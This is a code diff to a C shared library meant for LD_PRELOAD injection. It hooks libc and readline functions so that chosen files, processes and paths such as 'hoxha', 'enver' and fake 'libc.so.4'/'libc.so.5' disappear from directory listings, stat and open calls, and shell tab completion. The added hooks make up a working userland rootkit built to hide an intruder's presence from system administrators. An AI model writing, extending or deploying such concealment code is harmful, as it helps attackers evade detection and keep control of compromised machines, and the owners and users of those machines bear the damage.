@@ -11,6 +11,9 @@
 #include <sys/types.h>
 #include <sys/syscall.h>
 #include <stdint.h>
+#include <stdarg.h>
+#include <readline/readline.h>
+#include <readline/history.h>
 
 #define MAX_HIDDEN 32  // Increased to allow dynamic PID entries too
 
@@ -24,6 +27,9 @@ static const char *STATIC_HIDE_NAMES[] = {
 };
 
 static char *hide_names[MAX_HIDDEN + 1] = { 0 };
+
+// Forward declaration of libhide function
+static int libhide(const char *name);
 
 // Helpers to add names or PIDs to hide
 static void add_hide_name(const char *name) {
@@ -39,6 +45,183 @@ static void add_hide_pid(pid_t pid) {
     char buf[16];
     snprintf(buf, sizeof(buf), "%d", pid);
     add_hide_name(buf);
+}
+
+// Stat, getdents and readline hooks for tab complete and others
+static int (*orig_stat)(const char *, struct stat *) = NULL;
+static int (*orig_lstat)(const char *, struct stat *) = NULL;
+static int (*orig_fstat)(int, struct stat *) = NULL;
+static int (*orig_stat64)(const char *, struct stat64 *) = NULL;
+static int (*orig_lstat64)(const char *, struct stat64 *) = NULL;
+static int (*orig_fstat64)(int, struct stat64 *) = NULL;
+static struct dirent *(*orig_readdir)(DIR *) = NULL;
+static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
+static char *(*orig_readline)(const char *) = NULL;
+static char **(*orig_rl_completion_matches)(const char *, rl_compentry_func_t *) = NULL;
+static char *(*orig_rl_filename_completion_function)(const char *, int) = NULL;
+static rl_compentry_func_t *orig_rl_completion_entry_function = NULL;
+static long (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int) = NULL;
+static long (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int) = NULL;
+
+// Custom completion generator that filters hidden files
+static char *custom_filename_completion_function(const char *text, int state) {
+    static DIR *dir = NULL;
+    static char *filename = NULL;
+    static size_t text_len = 0;
+    static char *dirpath_copy = NULL;
+    struct dirent *entry;
+    char *result = NULL;
+
+    // If this is the first call for this completion, initialize
+    if (!state) {
+        if (dir) {
+            closedir(dir);
+            dir = NULL;
+        }
+        if (dirpath_copy) {
+            free(dirpath_copy);
+            dirpath_copy = NULL;
+        }
+        if (filename) {
+            free(filename);
+            filename = NULL;
+        }
+        
+        const char *dirpath = ".";
+        const char *last_slash = strrchr(text, '/');
+        
+        if (last_slash) {
+            // Text contains a path, extract directory and filename parts
+            size_t dir_len = last_slash - text + 1;
+            dirpath_copy = malloc(dir_len + 1);
+            strncpy(dirpath_copy, text, dir_len);
+            dirpath_copy[dir_len] = '\0';
+            dirpath = dirpath_copy;
+            text = last_slash + 1;
+        }
+        
+        dir = opendir(dirpath);
+        if (!dir) {
+            if (dirpath_copy) {
+                free(dirpath_copy);
+                dirpath_copy = NULL;
+            }
+            return NULL;
+        }
+        
+        text_len = strlen(text);
+    }
+
+    // Search for matching entries
+    while ((entry = readdir(dir)) != NULL) {
+        // Skip hidden files and directories starting with . unless explicitly typed
+        if (entry->d_name[0] == '.' && text[0] != '.') {
+            continue;
+        }
+        
+        // Check if this entry matches our text
+        if (strncmp(entry->d_name, text, text_len) == 0) {
+            // Check if this is a hidden entry we need to filter
+            if (libhide(entry->d_name)) {
+                continue; // Skip hidden entries
+            }
+            
+            filename = strdup(entry->d_name);
+            break;
+        }
+    }
+
+    if (filename) {
+        // Reconstruct full path if we had a directory component
+        if (dirpath_copy) {
+            result = malloc(strlen(dirpath_copy) + strlen(filename) + 1);
+            strcpy(result, dirpath_copy);
+            strcat(result, filename);
+        } else {
+            result = strdup(filename);
+        }
+        free(filename);
+        filename = NULL;
+    } else {
+        if (dir) {
+            closedir(dir);
+            dir = NULL;
+        }
+        if (dirpath_copy) {
+            free(dirpath_copy);
+            dirpath_copy = NULL;
+        }
+    }
+
+    return result;
+}
+
+// Hook rl_filename_completion_function
+char *rl_filename_completion_function(const char *text, int state) {
+    if (!orig_rl_filename_completion_function) {
+        *(void **)&orig_rl_filename_completion_function = 
+            dlsym(RTLD_NEXT, "rl_filename_completion_function");
+    }
+    
+    char *result = custom_filename_completion_function(text, state);
+    if (!result && orig_rl_filename_completion_function) {
+        // Fall back to original function, but filter its results
+        result = orig_rl_filename_completion_function(text, state);
+        if (result) {
+            // Extract basename to check if hidden
+            const char *basename = strrchr(result, '/');
+            basename = basename ? basename + 1 : result;
+            if (libhide(basename)) {
+                free(result);
+                return NULL;
+            }
+        }
+    }
+    
+    return result;
+}
+
+// Hook rl_completion_matches to filter completion results
+char **rl_completion_matches(const char *text, rl_compentry_func_t *entry_func) {
+    if (!orig_rl_completion_matches) {
+        *(void **)&orig_rl_completion_matches = 
+            dlsym(RTLD_NEXT, "rl_completion_matches");
+    }
+    
+    // If this is filename completion, use our custom function
+    if (entry_func == rl_filename_completion_function || 
+        (orig_rl_filename_completion_function && entry_func == orig_rl_filename_completion_function)) {
+        return orig_rl_completion_matches(text, rl_filename_completion_function);
+    }
+    
+    char **matches = orig_rl_completion_matches(text, entry_func);
+    if (!matches) return NULL;
+    
+    // Filter out hidden entries from the matches array
+    int i, j;
+    for (i = 0, j = 0; matches[i] != NULL; i++) {
+        // Extract just the filename part for checking
+        const char *basename = strrchr(matches[i], '/');
+        basename = basename ? basename + 1 : matches[i];
+        
+        if (!libhide(basename)) {
+            matches[j++] = matches[i];
+        } else {
+            free(matches[i]);
+        }
+    }
+    matches[j] = NULL;
+    
+    return matches;
+}
+
+// Hook the main readline function
+char *readline(const char *prompt) {
+    if (!orig_readline) {
+        *(void **)&orig_readline = dlsym(RTLD_NEXT, "readline");
+    }
+    
+    return orig_readline(prompt);
 }
 
 // Initialization to populate hide_names[]
@@ -145,10 +328,6 @@ struct linux_dirent64 {
     char           d_name[];
 };
 
-// Hook getdents and getdents64 syscalls using syscall wrappers
-static long (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int) = NULL;
-static long (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int) = NULL;
-
 // Wrapper for getdents syscall
 long getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
     if (!orig_getdents) {
@@ -222,18 +401,114 @@ ssize_t getdents64(int fd, void *dirp, size_t count) {
     return getdents64_syscall(fd, (struct linux_dirent64 *)dirp, count);
 }
 
-// Stat hooks for tab complete and others
-static int (*orig_stat)(const char *, struct stat *) = NULL;
-static int (*orig_lstat)(const char *, struct stat *) = NULL;
-static int (*orig_fstat)(int, struct stat *) = NULL;
-static int (*orig_stat64)(const char *, struct stat64 *) = NULL;
-static int (*orig_lstat64)(const char *, struct stat64 *) = NULL;
-static int (*orig_fstat64)(int, struct stat64 *) = NULL;
-
+// Enhanced should_hide_path function
 static int should_hide_path(const char *path) {
+    if (!path) return 0;
+    
     const char *basename = strrchr(path, '/');
     basename = basename ? basename + 1 : path;
-    return libhide(basename);
+    
+    // Check basename first (your existing logic)
+    if (libhide(basename)) return 1;
+    
+    // Also check if the full path contains hidden patterns
+    if (strstr(path, "/hoxha") || strstr(path, "/enver") ||
+        strstr(path, "/libc.so.4") || strstr(path, "/libc.so.5") ||
+        strstr(path, "hoxha/") || strstr(path, "enver/")) {
+        return 1;
+    }
+    
+    return 0;
+}
+
+// 1. access() - CRITICAL for bash tab completion
+static int (*orig_access)(const char *, int) = NULL;
+
+int access(const char *path, int mode) {
+    if (!orig_access) {
+        *(void **)&orig_access = dlsym(RTLD_NEXT, "access");
+    }
+    
+    if (should_hide_path(path)) {
+        errno = ENOENT;
+        return -1;
+    }
+    
+    return orig_access(path, mode);
+}
+
+// 2. opendir() - sometimes called directly
+static DIR *(*orig_opendir)(const char *) = NULL;
+
+DIR *opendir(const char *name) {
+    if (!orig_opendir) {
+        *(void **)&orig_opendir = dlsym(RTLD_NEXT, "opendir");
+    }
+    
+    if (should_hide_path(name)) {
+        errno = ENOENT;
+        return NULL;
+    }
+    
+    return orig_opendir(name);
+}
+
+// 3. fopen() - used by completion scripts
+static FILE *(*orig_fopen)(const char *, const char *) = NULL;
+
+FILE *fopen(const char *path, const char *mode) {
+    if (!orig_fopen) {
+        *(void **)&orig_fopen = dlsym(RTLD_NEXT, "fopen");
+    }
+    
+    if (should_hide_path(path)) {
+        errno = ENOENT;
+        return NULL;
+    }
+    
+    return orig_fopen(path, mode);
+}
+
+// 4. open() - low-level file opening
+static int (*orig_open)(const char *, int, ...) = NULL;
+
+int open(const char *path, int flags, ...) {
+    if (!orig_open) {
+        *(void **)&orig_open = dlsym(RTLD_NEXT, "open");
+    }
+    
+    if (should_hide_path(path)) {
+        errno = ENOENT;
+        return -1;
+    }
+    
+    va_list ap;
+    va_start(ap, flags);
+    mode_t mode = va_arg(ap, mode_t);
+    va_end(ap);
+    
+    return orig_open(path, flags, mode);
+}
+
+// 5. open64() - 64-bit version of open
+static int (*orig_open64)(const char *, int, ...) = NULL;
+
+int open64(const char *path, int flags, ...) {
+    if (!orig_open64) {
+        *(void **)&orig_open64 = dlsym(RTLD_NEXT, "open64");
+    }
+    
+    if (should_hide_path(path)) {
+        errno = ENOENT;
+        return -1;
+    }
+    
+    va_list ap;
+    va_start(ap, flags);
+    mode_t mode = va_arg(ap, mode_t);
+    va_end(ap);
+    
+    return orig_open64(path, flags, mode);
 }
 
 int stat(const char *path, struct stat *buf) {
@@ -301,10 +576,6 @@ int fstat64(int fd, struct stat64 *buf) {
     }
     return orig_fstat64(fd, buf);
 }
-
-// Readdir hooks 
-static struct dirent *(*orig_readdir)(DIR *) = NULL;
-static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
 
 struct dirent *readdir(DIR *dirp) {
     if (!orig_readdir) {
